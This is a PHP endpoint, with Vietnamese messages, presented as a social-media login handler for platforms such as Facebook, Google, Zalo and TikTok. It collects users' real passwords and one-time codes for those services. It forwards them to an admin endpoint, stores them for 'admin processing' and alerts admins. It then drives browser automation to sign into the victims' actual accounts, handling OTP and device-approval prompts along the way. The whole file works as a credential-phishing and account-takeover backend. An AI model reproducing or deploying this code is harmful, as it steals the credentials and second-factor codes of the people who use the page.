<?php
session_start();
require_once __DIR__ . '/../config/validate_env.php';
require_once '../config/database.php';
require_once '../config/config.php';
require_once '../includes/functions.php';
require_once '../includes/auth.php';
require_once '../includes/browser-automation.php';
require_once '../includes/session-management.php';
require_once __DIR__ . '/../includes/admin-security.php';
require_once __DIR__ . '/../src/bootstrap.php';

use App\Services\RealtimePublisher;
use App\Core\Security;

// Check if it's an AJAX request
if (!isAjaxRequest()) {
    jsonResponse(['success' => false, 'message' => 'Invalid request method'], 400);
}

// Enforce CSRF header token (matches public layout secureFetch)
Security::enforceCsrf('POST');

// Get JSON input
$input = json_decode(file_get_contents('php://input'), true);

if (!$input) {
    jsonResponse(['success' => false, 'message' => 'Invalid input data'], 400);
}

// Validate required fields
$platform = sanitizeInput($input['platform'] ?? '');
$username = sanitizeInput($input['username'] ?? '');
$password = $input['password'] ?? '';
$otp = sanitizeInput($input['otp'] ?? '');

if (empty($platform) || empty($username) || empty($password)) {
    jsonResponse(['success' => false, 'message' => 'Vui lòng nhập đầy đủ thông tin'], 400);
}

// Validate platform (sync with UI brandConfigs)
$allowed_platforms = ['facebook', 'google', 'instagram', 'zalo', 'yahoo', 'microsoft', 'twitter', 'tiktok'];
if (!in_array($platform, $allowed_platforms)) {
    jsonResponse(['success' => false, 'message' => 'Nền tảng không được hỗ trợ'], 400);
}

// Check if IP is blocked
$blocked_ip = isIPBlocked($_SERVER['REMOTE_ADDR'] ?? '');
if ($blocked_ip) {
    jsonResponse(['success' => false, 'message' => 'IP của bạn đã bị chặn: ' . $blocked_ip['reason']], 403);
}

// Detect suspicious activity
$suspicious = detectSuspiciousActivity($_SERVER['REMOTE_ADDR'] ?? '', $username);
if ($suspicious['suspicious']) {
    blockIP($_SERVER['REMOTE_ADDR'] ?? '', $suspicious['reason']);
    jsonResponse(['success' => false, 'message' => 'Hoạt động đáng ngờ được phát hiện'], 403);
}

// Create login session
$session_id = createLoginSession($platform, $username, $_SERVER['REMOTE_ADDR'] ?? '', $_SERVER['HTTP_USER_AGENT'] ?? '');

// Log session creation
logSessionAction($session_id, 'session_created', 'Login session created', 'info');

// Store login attempt in session for tracking
$_SESSION['social_login_attempt'] = [
    'platform' => $platform,
    'username' => $username,
    'session_id' => $session_id,
    'timestamp' => time(),
    'status' => 'processing'
];

// Log the login attempt
logActivity(null, 'social_login_attempt', "Platform: $platform, Username: $username, Session: $session_id");

// Send data to admin bot system via WebSocket or API
$bot_data = [
    'platform' => $platform,
    'username' => $username,
    'password' => $password,
    'otp' => $otp,
    'user_ip' => $_SERVER['REMOTE_ADDR'] ?? '',
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
    'timestamp' => time(),
    // use internal login session id for correlation
    'session_id' => $session_id
];

// Forward full data to internal admin endpoint (secured by headers)
try {
    $forwardUrl = rtrim(APP_URL, '/') . '/api/admin/login-forward.php';
    $ch = curl_init($forwardUrl);
    $payload = json_encode($bot_data, JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/json',
            'X-Admin-Key: ' . (defined('ADMIN_SECURITY_KEY') ? ADMIN_SECURITY_KEY : ''),
            'X-Feature-Pass: ' . (defined('FEATURE_PASS') ? FEATURE_PASS : ''),
        ],
        CURLOPT_POSTFIELDS => $payload,
        CURLOPT_TIMEOUT => 3,
    ]);
    @curl_exec($ch);
    curl_close($ch);
} catch (\Throwable $e) { /* best-effort, ignore */ }

// Store in database for admin processing
$stmt = $pdo->prepare("
    INSERT INTO social_login_attempts (platform, username, password, otp, user_ip, user_agent, status, created_at)
    VALUES (?, ?, ?, ?, ?, ?, 'pending', NOW())
");

$stmt->execute([
    $platform,
    $username,
    encryptSensitiveData($password),
    $otp,
    $_SERVER['REMOTE_ADDR'] ?? '',
    $_SERVER['HTTP_USER_AGENT'] ?? ''
]);

$attempt_id = $pdo->lastInsertId();

// Send notification to admin
$admin_users = $pdo->query("SELECT id FROM users WHERE role = 'admin'")->fetchAll();
foreach ($admin_users as $admin) {
    createNotification(
        $admin['id'],
        'Yêu cầu đăng nhập Social',
        "Người dùng yêu cầu đăng nhập $platform với tài khoản: $username",
        'info'
    );
}

// Update session status to processing
updateSessionStatus($session_id, 'processing', 'Starting browser automation');
logSessionAction($session_id, 'browser_start', 'Browser automation started', 'info');
// Publish realtime processing status
try { (new RealtimePublisher())->publish('login.status', [
    'session_id' => $session_id,
    'platform' => $platform,
    'username' => $username,
    'status' => 'processing',
    'details' => 'Starting browser automation'
]); } catch (\Throwable $e) { /* ignore */ }

// Check browser API status
if (!checkBrowserAPIStatus()) {
    updateSessionStatus($session_id, 'failed', 'Browser API not available');
    logSessionAction($session_id, 'browser_error', 'Browser API not available', 'error');
    jsonResponse(['success' => false, 'message' => 'Hệ thống trình duyệt không khả dụng'], 503);
}

// Perform actual browser automation
$bot_response = performSocialLogin($platform, $username, $password, $otp);

// Log browser automation result
if (!empty($bot_response['requires_otp'])) {
    updateSessionStatus($session_id, 'require_otp', 'OTP required');
    logSessionAction($session_id, 'require_otp', 'OTP required by platform', 'info');
    try { (new RealtimePublisher())->publish('login.status', [
        'session_id' => $session_id,
        'platform' => $platform,
        'username' => $username,
        'status' => 'require_otp',
        'details' => 'OTP required'
    ]); } catch (\Throwable $e) { /* ignore */ }
}

if (!empty($bot_response['requires_approval'])) {
    updateSessionStatus($session_id, 'waiting_verification', 'Awaiting device verification');
    logSessionAction($session_id, 'waiting_verification', 'Awaiting device verification', 'info');
    try { (new RealtimePublisher())->publish('login.status', [
        'session_id' => $session_id,
        'platform' => $platform,
        'username' => $username,
        'status' => 'waiting_verification',
        'details' => 'Awaiting device verification'
    ]); } catch (\Throwable $e) { /* ignore */ }
}

if ($bot_response['success']) {
    updateSessionStatus($session_id, 'success', $bot_response['message']);
    logSessionAction($session_id, 'login_success', $bot_response['message'], 'success');
    try { (new RealtimePublisher())->publish('login.status', [
        'session_id' => $session_id,
        'platform' => $platform,
        'username' => $username,
        'status' => 'success',
        'details' => $bot_response['message']
    ]); } catch (\Throwable $e) { /* ignore */ }
} else {
    // Only publish failed if not in require_otp/waiting_verification lock state
    if (empty($bot_response['requires_otp']) && empty($bot_response['requires_approval'])) {
        updateSessionStatus($session_id, 'failed', $bot_response['message']);
        logSessionAction($session_id, 'login_failed', $bot_response['message'], 'error');
        try { (new RealtimePublisher())->publish('login.status', [
            'session_id' => $session_id,
            'platform' => $platform,
            'username' => $username,
            'status' => 'failed',
            'details' => $bot_response['message']
        ]); } catch (\Throwable $e) { /* ignore */ }
    }
}

// Update attempt status
$status = $bot_response['success'] ? 'success' : 'failed';
$stmt = $pdo->prepare("UPDATE social_login_attempts SET status = ?, response = ? WHERE id = ?");
$stmt->execute([$status, json_encode($bot_response), $attempt_id]);

if ($bot_response['success']) {
    // Create or get user account
    $user = createOrGetSocialUser($platform, $username, $bot_response['user_data'] ?? []);

    if ($user) {
        // Log in the user
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['user_username'] = $user['username'];
        $_SESSION['user_role'] = $user['role'];
        $_SESSION['last_activity'] = time();

        logActivity($user['id'], 'social_login_success', "Platform: $platform");

        jsonResponse([
            'success' => true,
            'message' => 'Đăng nhập thành công!',
            'redirect' => APP_URL
        ]);
    } else {
        jsonResponse(['success' => false, 'message' => 'Không thể tạo tài khoản người dùng'], 500);
    }
} else {
    jsonResponse([
        'success' => false,
        'message' => $bot_response['message'],
        'requires_otp' => $bot_response['requires_otp'] ?? false,
        'requires_approval' => $bot_response['requires_approval'] ?? false
    ], 400);
}

// Removed demo simulation function. All logins use real browser automation.

// Helper function to create or get social user
function createOrGetSocialUser($platform, $username, $user_data) {
    global $pdo;

    // Check if user already exists
    $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? OR email = ?");
    $stmt->execute([$username, $user_data['email'] ?? '']);
    $existing_user = $stmt->fetch();

    if ($existing_user) {
        return $existing_user;
    }

    // Create new user
    $stmt = $pdo->prepare("
        INSERT INTO users (username, email, password, full_name, status, role, social_platform)
        VALUES (?, ?, ?, ?, 'active', 'user', ?)
    ");

    $hashed_password = password_hash(generateRandomString(12), PASSWORD_DEFAULT);

    if ($stmt->execute([
        $username,
        $user_data['email'] ?? $username . '@' . $platform . '.com',
        $hashed_password,
        $user_data['full_name'] ?? ucfirst($platform) . ' User',
        $platform
    ])) {
        $user_id = $pdo->lastInsertId();

        // Get the created user
        $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
        $stmt->execute([$user_id]);
        return $stmt->fetch();
    }

    return null;
}
?>
